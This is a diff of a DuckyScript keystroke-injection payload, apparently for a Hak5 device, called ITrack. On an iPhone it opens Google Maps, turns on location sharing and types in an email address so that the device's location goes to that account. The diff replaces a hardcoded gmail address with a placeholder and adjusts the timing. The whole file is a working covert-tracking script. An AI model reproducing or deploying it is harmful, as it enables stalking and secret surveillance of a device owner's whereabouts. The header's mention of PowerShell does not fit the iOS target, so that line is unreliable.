@@ -1,48 +1,38 @@
-REM Title: ITrack
+REM Title: ITrack_CrossPV
 REM Author: Sideswipe(sideswipeishacking)
 REM Description: Opens hidden powershell and
 REM Target: IOS
 REM Props: Hak5
 REM Version: 1.2
 REM Category: Mobile
-
-DEFINE #EMAIL yneverknow498@gmail.com
-
-REM Default Delay optimzed for Iphone 14 Pro
-DEFAULT_DELAY 100
+DEFAULT_DELAY 600
 DELAY 200
 
 REM Open Google Maps
 GUI h
 GUI h
-DELAY 300
 GUI SPACE
-DELAY 300
 DELETE
 STRING Google Maps
 ENTER
-DELAY 500
 
 
 REM Navigate to Google Location Sharing Settings
 TAB
 TAB
 SPACE
-DELAY 300
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 SPACE
-DELAY 400
 
 
 REM Enable Location Sharing
 DOWNARROW
 TAB
 SPACE
-DELAY 400
 TAB
 TAB
 DOWNARROW
@@ -69,15 +59,13 @@ RIGHTARROW
 RIGHTARROW
 RIGHTARROW
 RIGHTARROW
-DEFAULT_DELAY 200
+DEFAULT_DELAY 600
 DELAY 600
 SPACE
-DELAY 600
 TAB
 SPACE
 ENTER
-DEFAULT_DELAY 100
-STRING #EMAIL
+STRING sideswipe@exmaple.com
 ENTER
 TAB
 TAB
